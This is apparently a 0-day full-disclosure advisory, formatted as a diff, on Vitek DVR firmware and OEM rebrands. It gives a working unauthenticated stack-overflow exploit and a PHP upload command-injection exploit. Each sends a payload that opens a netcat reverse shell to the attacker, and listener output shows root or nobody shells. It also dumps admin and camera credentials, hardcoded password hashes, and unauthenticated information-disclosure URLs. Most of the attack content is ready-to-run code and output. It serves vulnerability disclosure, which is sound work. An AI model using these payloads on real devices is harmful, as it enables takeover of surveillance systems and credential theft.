@@ -1,0 +1,201 @@
+[STX]
+
+Subject: Vitek RCE and Information Disclosure (and possible other OEM)
+
+Attack vector: Remote
+Authentication: Anonymous (no credentials needed)
+Researcher: bashis <mcw noemail eu> (December 2017)
+PoC: https://github.com/mcw0/PoC
+Release date: December 22, 2017
+Full Disclosure: 0-day
+
+heap: Executable + Non-ASLR
+stack: Executable + ASLR
+
+-[Manufacture Logo]-
+            _ _ _ _ _ _ _ _ _ _ _ _
+            \  _  _   _  _ _ ___
+            / /__/ \ |_/
+           / __   /  -  _ ___
+          / /  / /  / /
+  _ _ _ _/ /  /  \_/  \_ ______
+___________\___\__________________
+
+
+-[OEM (found in the code)]-
+Vitek (http://www.vitekcctv.com/) - Verified: VT-HDOC16BR_Firmware_1.02Y_UI_1.0.1.R
+Thrive
+Wisecon
+Sanyo
+Inodic
+CBC
+Elbex
+Y3K
+KTNC
+
+
+-[Stack Overflow RCE]-
+
+[Reverse netcat shell]
+
+$ echo -en "GET /dvrcontrol.cgi?nc\x24\x7bIFS\x7d192.168.57.1\x24\x7bIFS\x7d31337\x24\x7bIFS\x7d-e\x24\x7bIFS\x7dsh\x24\x7bIFS\x7d HTTP/1.0\r\nAuthorization Pwned: `for((i=0;i<272;i++)); do echo -en "A";done`\x80\x9a\x73\x02\xc8\x4a\x11\x20\r\n\r\n"|ncat 192.168.57.20 81
+
+[Listener]
+
+$ ncat -vlp 31337
+Ncat: Version 7.60 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: E672 0A5B B852 8EF9 36D0 E979 2827 1FAD 7482 8A7B
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+
+Ncat: Connection from 192.168.57.20.
+Ncat: Connection from 192.168.57.20:36356.
+
+pwd
+/opt/fw
+
+whoami
+root
+exit
+$
+
+Note:
+1. Badbytes: 0x00,0x09,0x0a,0x0b,0x0c,0x0d,0x20
+2. 0x20 will be replaced with 0x00 by the H4/H1/N1 binary, use this to jump binary included system() address: 0x00114AC8 [system() call in H4]
+3. 0x02739A0C + 0x74 = $r11 address we need (0x2739A80) to point our CMD string on heap for system() in $r0
+
+H1:
+VT-HDOC4E_Firmware_1.21A_UI_1.1.C.6
+.rodata:005292E8 aEchoSOptVideoS DCB "echo %s > /opt/video_standard",0
+.text:001CD138                 SUB             R3, R11, #0x74
+.text:001CD13C                 MOV             R0, R3
+.text:001CD140                 BL              system
+
+H4:
+VT-HDOC16BR_Firmware_1.02Y_UI_1.0.1.R
+.rodata:00B945A0 aEchoSOptVideoS DCB "echo %s > /opt/video_standard",0
+.text:00114AC8                 SUB             R3, R11, #0x74
+.text:00114ACC                 MOV             R0, R3
+.text:00114AD0                 BL              system
+
+N1:
+VT-HDOC8E_Firmware_1.21E_UI_1.1.C.6
+.rodata:004A4AC4 aEchoSOptVideoS DCB "echo %s > /opt/video_standard",0
+.text:001E9F0C                 SUB             R3, R11, #0x74
+.text:001E9F10                 MOV             R0, R3
+.text:001E9F14                 BL              system
+
+
+-[PHP RCE]-
+
+Note: /mnt/usb2 must be mounted and R/W... (normally R/O w/o USB stick inserted)
+
+[Reverse netcat shell (forking)]
+
+$ curl -v 'http://192.168.57.20:80/cgi-bin/php/htdocs/system/upload_check.php' -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1337" -d "`echo -en "\r\n\r\n------WebKitFormBoundary1337\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000000\r\n------WebKitFormBoundary1337\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"\|\|nc\$\{IFS\}\$\{REMOTE_ADDR\}\$\{IFS\}31337\$\{IFS\}-e\$\{IFS\}sh\$\{IFS\}\&\$\{IFS\}\|\|\"\r\nContent-Type: application/gzip\r\n\r\nPWNED\r\n\r\n------WebKitFormBoundary1337--\r\n\r\n"`" -X POST
+
+200 OK
+[...]
+> ERROR : Current_fw_info File Open Error<br>> ERROR : dvr_upgrade File Open Error<br>F/W File(||nc${IFS}${REMOTE_ADDR}${IFS}31337${IFS}-e${IFS}sh${IFS}&${IFS}||) Upload Completed.<br>If you want to upgrade please click START button<br><br><form enctype="multipart/form-data" action="fw_update.php" method="post"><input type="hidden" name="PHPSESSID" value="67eaa14441089e5d2e7fe6ff0fa88d42" /><input type="submit" value="START"></form>	</tbody>
+[...]
+
+[Listener]
+
+$ ncat -vlp 31337
+Ncat: Version 7.60 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 76D3 7FA3 396A B9F6 CCA6 CEA5 2EF8 06DF FF72 79EF
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 192.168.57.20.
+Ncat: Connection from 192.168.57.20:52726.
+
+pwd
+/opt/www/htdocs/system
+
+whoami
+nobody
+
+ls -l /mnt/usb2/
+total 4
+drwxrwxrwx    2 nobody   nobody           0 Dec 16 02:55 dvr
+-rw-------    1 nobody   nobody           7 Dec 16 02:55 ||nc${IFS}${REMOTE_ADDR}${IFS}31337${IFS}-e${IFS}sh${IFS}&${IFS}||
+exit
+$
+
+-[Login / Password Disclosure]-
+
+curl -v "http://192.168.57.20:80/menu.env" | hexdump -C
+[binary config, login and password can be found for admin login and all connected cameras]
+
+Admin l/p
+[...]
+00001380  00 00 00 00 01 01 00 01  01 01 01 00 00 00 00 00  |................|
+00001390  00 00 00 00 00 41 44 4d  49 4e 00 00 00 00 00 00  |.....ADMIN......|
+000013a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001400  00 00 00 00 00 00 00 00  00 00 00 00 00 00 31 32  |..............12|
+00001410  33 34 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |34..............|
+00001420  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+
+Cameras l/p
+[...]
+00008d80  00 00 00 00 c0 00 a8 00  01 00 15 00 92 1f 00 00  |................|
+00008d90  91 1f 00 00 72 6f 6f 74  00 00 00 00 00 00 00 00  |....root........|
+00008da0  00 00 00 00 70 61 73 73  00 00 00 00 00 00 00 00  |....pass........|
+00008db0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00008dc0  00 00 00 00 00 00 00 00  00 00 00 00 c0 00 a8 00  |................|
+00008dd0  01 00 16 00 94 1f 00 00  93 1f 00 00 72 6f 6f 74  |............root|
+00008de0  00 00 00 00 00 00 00 00  00 00 00 00 70 61 73 73  |............pass|
+00008df0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+
+-[Hardcode l/p]-
+FTP: TCP/10021
+TELNET: TCP/10023
+
+/etc/passwd
+root:$1$5LFGqGq.$fUozHRdzvapI2qBf1EeoJ0:0:0:root:/root:/bin/sh
+woody:$1$e0vY7A0V$BjS38SsHNWC5DxEGlzuEP1:1001:100:woohyun digital user:/home/woody:/bin/sh
+
+-[Korean hardcoded DNS]-
+$ cat /etc/resolv.conf
+nameserver 168.126.63.1
+nameserver 0.0.0.0
+nameserver 0.0.0.0
+$
+
+$ nslookup 168.126.63.1
+1.63.126.168.in-addr.arpa	name = kns.kornet.net.
+$ nslookup 168.126.63.2
+2.63.126.168.in-addr.arpa	name = kns2.kornet.net.
+
+
+-[Other Information Disclosure]-
+curl -v "http://192.168.57.20:80/webviewer/netinfo.dat"
+192,168,57,20
+192,168,2,100
+00:0A:2F:XX:XX:XX
+00:0A:2F:YY:YY:YY
+255.255.255.0
+192.168.57.1
+
+-[MAC Address Details]-
+Company: Artnix Inc.
+Address: Seoul 137-819, KOREA, REPUBLIC OF
+Range: 00:0A:2F:00:00:00 - 00:0A:2F:FF:FF:FF
+Type: IEEE MA-L
+
+curl -v "http://192.168.57.20:80/webviewer/gw.dat"
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 eth1
+192.168.57.0    0.0.0.0         255.255.255.0   U     0      0        0 eth0
+0.0.0.0         192.168.57.1    0.0.0.0         UG    0      0        0 eth0
+
+curl -v "http://192.168.57.20:80/cgi-bin/php/lang_change.php?lang=0"
+Change GUI Language to English
+
+[... and more]
+
+[ETX]
